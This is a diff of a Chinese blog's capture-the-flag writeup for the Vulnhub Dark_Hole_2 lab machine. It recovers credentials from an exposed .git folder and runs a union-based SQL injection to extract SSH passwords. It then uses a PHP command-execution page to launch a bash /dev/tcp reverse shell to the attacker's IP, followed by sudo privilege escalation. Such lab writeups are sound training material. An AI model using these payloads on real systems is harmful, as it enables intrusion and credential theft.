@@ -112,30 +112,12 @@
         <li><a class="icon" aria-label="下一篇" href="/2022/05/07/26%20Vulnhub%20School%20Writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
       <span id="i-prev" class="info" style="display:none;">上一篇</span>
       <span id="i-next" class="info" style="display:none;">下一篇</span>
       <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
     </span>
     <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/05/07/25%20Vulnhub%20Dark_Hole_2%20Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/05/07/25%20Vulnhub%20Dark_Hole_2%20Writeup/&text=25 Vulnhub Dark_Hole_2 Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/05/07/25%20Vulnhub%20Dark_Hole_2%20Writeup/&title=25 Vulnhub Dark_Hole_2 Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/05/07/25%20Vulnhub%20Dark_Hole_2%20Writeup/&is_video=false&description=25 Vulnhub Dark_Hole_2 Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=25 Vulnhub Dark_Hole_2 Writeup&body=Check out this article: https://hdfzzf.github.io/2022/05/07/25%20Vulnhub%20Dark_Hole_2%20Writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/05/07/25%20Vulnhub%20Dark_Hole_2%20Writeup/&title=25 Vulnhub Dark_Hole_2 Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/05/07/25%20Vulnhub%20Dark_Hole_2%20Writeup/&title=25 Vulnhub Dark_Hole_2 Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/05/07/25%20Vulnhub%20Dark_Hole_2%20Writeup/&title=25 Vulnhub Dark_Hole_2 Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/05/07/25%20Vulnhub%20Dark_Hole_2%20Writeup/&title=25 Vulnhub Dark_Hole_2 Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/05/07/25%20Vulnhub%20Dark_Hole_2%20Writeup/&name=25 Vulnhub Dark_Hole_2 Writeup&description=&lt;p&gt;该靶机作者给出的难度是高，但我认为达不到高难度。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/05/07/25%20Vulnhub%20Dark_Hole_2%20Writeup/&t=25 Vulnhub Dark_Hole_2 Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
     <div id="toc">
       <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">2. 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. 主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. 访问http服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">2.3.</span> <span class="toc-text">2.3. get shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B0%B4%E5%B9%B3%E7%A7%BB%E5%8A%A8"><span class="toc-number">2.4.</span> <span class="toc-text">2.4. 水平移动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#losy"><span class="toc-number">2.4.1.</span> <span class="toc-text">2.4.1. losy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#lama"><span class="toc-number">2.4.2.</span> <span class="toc-text">2.4.2. lama</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.5.</span> <span class="toc-text">2.5. 权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%95%AA%E5%A4%96"><span class="toc-number">3.</span> <span class="toc-text">3. 番外</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">4. 总结</span></a></li></ol>
     </div>
@@ -162,8 +144,6 @@
     <div class="postdate">
       
         <time datetime="2022-05-06T16:00:00.000Z" itemprop="datePublished">2022-05-07</time>
-        
-        (Updated: <time datetime="2022-05-07T05:37:59.630Z" itemprop="dateModified">2022-05-07</time>)
         
       
     </div>
@@ -218,65 +198,36 @@
 </ul>
 <h1 id="渗透">2. 渗透</h1>
 <h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> arp-scan -l
-<span class="token function">sudo</span> nmap -p- <span class="token number">192.168</span>.100.22
-<span class="token function">sudo</span> nmap -p22,80 -A <span class="token number">192.168</span>.100.22<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 192.168.100.22</span><br><span class="line">sudo nmap -p22,80 -A 192.168.100.22</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507113549.png" /></p>
 <p>注意http服务上存在/.git/，以为着80端口可能有<strong>.git库泄露</strong></p>
 <h2 id="访问http服务">2.2. 访问http服务</h2>
 <p>直接访问80端口，页面上只有一个功能点，那就是login，但是现在还不知道邮箱和密码。</p>
-<p>将.git库下载到本地，直接使用wget，我利用githack得不到log消息。 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> -r http://192.168.100.22/.git/ <span class="token comment"># r 递归下载</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
-<p>得到以IP命名的文件。 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> <span class="token number">192.168</span>.100.22
-<span class="token function">git</span> log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
+<p>将.git库下载到本地，直接使用wget，我利用githack得不到log消息。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -r http://192.168.100.22/.git/ <span class="comment"># r 递归下载</span></span><br></pre></td></tr></table></figure></p>
+<p>得到以IP命名的文件。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> 192.168.100.22</span><br><span class="line">git <span class="built_in">log</span></span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507114533.png" /></p>
-<p>因此，将版本会退回a4d9....，然后查看login.php <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> reset --hard a4d900a8d85e8938d3601f3cef113ee293028e10
-<span class="token function">cat</span> login.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
-<p>从中找到了邮箱和密码： <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">email: lush@admin.com
-password: 321<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
+<p>因此，将版本会退回a4d9....，然后查看login.php <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard a4d900a8d85e8938d3601f3cef113ee293028e10</span><br><span class="line">cat login.php</span><br></pre></td></tr></table></figure></p>
+<p>从中找到了邮箱和密码： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">email: lush@admin.com</span><br><span class="line">password: 321</span><br></pre></td></tr></table></figure></p>
 <h2 id="get-shell">2.3. get shell</h2>
 <p>然后回到登陆界面登录</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507114821.png" /></p>
-<p>注意到url中有一个id=1，先测试是否存在sql注入： <pre class="line-numbers language-url" data-language="url"><code class="language-url">?id&#x3D;1&#39; # 白屏
-?id&#x3D;1&#39;--+ # 正常<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
+<p>注意到url中有一个id=1，先测试是否存在sql注入： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; # 白屏</span><br><span class="line">?id=1&#x27;--+ # 正常</span><br></pre></td></tr></table></figure></p>
 <p>因此存在SQL注入的漏洞，接下来就是常规的联合注入的过程。有一点不同的是，<strong>之前在判断字段数的时候，order by后面的数字和字段数不同都会错误，只有相同才不会出错。而该靶机当数字&lt;=字段数的时候不出错，数字&gt;字段数的时候出错</strong></p>
-<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1.</span> ?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' order by 6--+
-2. ?id=-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token comment">--+</span>
-<span class="token number">3.</span> ?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,user(),version(),4,@@basedir,database()--+
-4. ?id=-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token comment">--+</span>
-<span class="token number">5.</span> ?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,(select group_concat(column_name)from information_schema.columns where table_name='</span>ssh<span class="token string">'),3,4,5,6--+
-6. ?id=-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>id<span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span>pass<span class="token punctuation">,</span><span class="token number">6</span> <span class="token keyword">from</span> ssh<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>该数据库下还有其他信息，我都收集了，但是有用的就是ssh的账号和密码： <pre class="line-numbers language-none"><code class="language-none">username: jehad
-password: fool<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
-<p>直接ssh远程连接： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> jehad@192.168.100.22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> ?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 6--+</span></span><br><span class="line"><span class="string">2. ?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span><span class="comment">--+</span></span><br><span class="line"><span class="number">3.</span> ?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,user(),version(),4,@@basedir,database()--+</span></span><br><span class="line"><span class="string">4. ?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span><span class="comment">--+</span></span><br><span class="line"><span class="number">5.</span> ?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,(select group_concat(column_name)from information_schema.columns where table_name=&#x27;</span>ssh<span class="string">&#x27;),3,4,5,6--+</span></span><br><span class="line"><span class="string">6. ?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,id,<span class="keyword">user</span>,<span class="number">4</span>,pass,<span class="number">6</span> <span class="keyword">from</span> ssh<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<p>该数据库下还有其他信息，我都收集了，但是有用的就是ssh的账号和密码： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: jehad</span><br><span class="line">password: fool</span><br></pre></td></tr></table></figure></p>
+<p>直接ssh远程连接： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jehad@192.168.100.22</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507115951.png" /></p>
 <h2 id="水平移动">2.4. 水平移动</h2>
-<p>首先查看用户： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">jehad@darkhole:~$ <span class="token function">cat</span> /etc/passwd<span class="token operator">|</span><span class="token function">grep</span> <span class="token function">bash</span>
-root:x:0:0:root:/root:/bin/bash
-lama:x:1000:1000:darkhole:/home/lama:/bin/bash
-jehad:x:1001:1001:,,,:/home/jehad:/bin/bash
-losy:x:1002:1002:,,,:/home/losy:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>首先查看用户： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jehad@darkhole:~$ cat /etc/passwd|grep bash</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">lama:x:1000:1000:darkhole:/home/lama:/bin/bash</span><br><span class="line">jehad:x:1001:1001:,,,:/home/jehad:/bin/bash</span><br><span class="line">losy:x:1002:1002:,,,:/home/losy:/bin/bash</span><br></pre></td></tr></table></figure></p>
 <h3 id="losy">2.4.1. losy</h3>
-<p>进行了必要的收集之后，在/home/jehad/.bash_history中发现了重要的信息（节选） <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> losy
-<span class="token function">cat</span> authorized_keys
-<span class="token function">cat</span> id_rsa
-<span class="token function">cat</span> id_rsa.pub 
-<span class="token function">cat</span> authorized_keys 
-<span class="token function">touch</span> authorized_kyes
-<span class="token function">ssh</span> -L <span class="token number">127.0</span>.0.1:90:192.168.135.129:9999 jehad@192.168.135.129
-<span class="token function">curl</span> <span class="token string">"http://localhost:9999/?cmd=id"</span>
-<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>进行了必要的收集之后，在/home/jehad/.bash_history中发现了重要的信息（节选） <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> losy</span><br><span class="line">cat authorized_keys</span><br><span class="line">cat id_rsa</span><br><span class="line">cat id_rsa.pub </span><br><span class="line">cat authorized_keys </span><br><span class="line">touch authorized_kyes</span><br><span class="line">ssh -L 127.0.0.1:90:192.168.135.129:9999 jehad@192.168.135.129</span><br><span class="line">curl <span class="string">&quot;http://localhost:9999/?cmd=id&quot;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
 <p>原本以为losy可以利用公钥认证登录，但是被删除了。又注意到9999端口下可能存在着命令执行，因此查看该端口上执行的进程</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507120439.png" /></p>
-<p>/opt/web目录下有一个index.php，内容如下： <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">echo</span> <span class="token string double-quoted-string">"Parameter GET['cmd']"</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-<span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
-<p>很显然存在命令执行，于是我先尝试了/home/jehad/.bash_history里面的反弹shell的命令，但是行不通，于是使用如下命令： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token string">'bash -i >&amp; /dev/tcp/192.168.100.10/4444 0>&amp;1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>/opt/web目录下有一个index.php，内容如下： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Parameter GET[&#x27;cmd&#x27;]&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">echo</span> system(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>很显然存在命令执行，于是我先尝试了/home/jehad/.bash_history里面的反弹shell的命令，但是行不通，于是使用如下命令： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/192.168.100.10/4444 0&gt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure></p>
 <p>将其进行url编码</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507121853.png" /></p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://127.0.0.1:9999/?cmd<span class="token operator">=</span>bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F192%2E168%2E100%2E10%2F4444%200%3E%261%27          <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://127.0.0.1:9999/?cmd=bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F192%2E168%2E100%2E10%2F4444%200%3E%261%27          </span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507121921.png" /></p>
 <h3 id="lama">2.4.2. lama</h3>
 <p>直接使用MidPwds.txt字典爆破即可</p>
@@ -290,25 +241,21 @@ losy:x:1002:1002:,,,:/home/losy:/bin/bash<span aria-hidden="true" class="line-nu
 </ol>
 <p>直接执行sudo -l，失败了，尝试ssh登录losy，密码为gang，成功！接着sudo -l</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507123135.png" /></p>
-<p>接下来就很简单了： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> /usr/bin/python3 -c <span class="token string">"import pty;pty.spawn('/bin/bash')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>接下来就很简单了： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507123229.png" /></p>
 <p>如果之前得到lama的权限，就更简单了。同样查看sudo -l</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507123307.png" /></p>
-<p>直接切换成root即可 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">su</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>直接切换成root即可 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507123338.png" /></p>
-<p>最后，读取两个flag <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">1. /home/losy/user.txt
-DarkHole&#123;'This_is_the_life_man_better_than_a_cruise'&#125;
-
-2. /root/root.txt
-DarkHole&#123;'Legend'&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>最后，读取两个flag <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. /home/losy/user.txt</span><br><span class="line">DarkHole&#123;&#x27;This_is_the_life_man_better_than_a_cruise&#x27;&#125;</span><br><span class="line"></span><br><span class="line">2. /root/root.txt</span><br><span class="line">DarkHole&#123;&#x27;Legend&#x27;&#125;</span><br></pre></td></tr></table></figure></p>
 <h1 id="番外">3. 番外</h1>
-<p>其实在get shell的时候除了使用curl，还可以使用ssh，/home/jehad/.bash_history里面也涉及到了： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> -L <span class="token operator">&lt;</span>localport<span class="token operator">></span>:<span class="token operator">&lt;</span>remotethost<span class="token operator">></span>:<span class="token operator">&lt;</span>remotepost<span class="token operator">></span> <span class="token operator">&lt;</span>hostname@ip<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>其实在get shell的时候除了使用curl，还可以使用ssh，/home/jehad/.bash_history里面也涉及到了： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L &lt;localport&gt;:&lt;remotethost&gt;:&lt;remotepost&gt; &lt;hostname@ip&gt;</span><br></pre></td></tr></table></figure></p>
 <p><strong>本地转发</strong>：作用就是将本机的某个端口映射到远程主机的端口。这样远程主机就能通过对应的端口访问本机端口上的服务。</p>
-<p>因此，该靶机中可以如此： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kali: <span class="token function">ssh</span> -L <span class="token number">9999</span>:localhost:9999 jehad@192.168.100.22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>因此，该靶机中可以如此： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kali: ssh -L 9999:localhost:9999 jehad@192.168.100.22</span><br></pre></td></tr></table></figure></p>
 <p>解释：对于靶机来说，kali就是远程主机。因为是在kali上运行该命令，于是remotethost = localhost。这样子，就能够在kali的9990端口上访问靶机的9999端口。</p>
 <p>然后浏览器访问: 127.0.0.1:9999</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220507133252.png" /></p>
-<p>直接输入： <pre class="line-numbers language-none"><code class="language-none">?cmd&#x3D;bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F192%2E168%2E100%2E10%2F4444%200%3E%261%27   <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>直接输入： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=bash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F192%2E168%2E100%2E10%2F4444%200%3E%261%27   </span><br></pre></td></tr></table></figure></p>
 <p>即可反弹shell。</p>
 <h1 id="总结">4. 总结</h1>
 <p>对该靶机的渗透，有以下新的知识点：</p>
@@ -373,7 +320,6 @@ DarkHole&#123;'Legend'&#125;<span aria-hidden="true" class="line-numbers-rows"><
     <div id="actions-footer">
         <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
         <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
     </div>
 
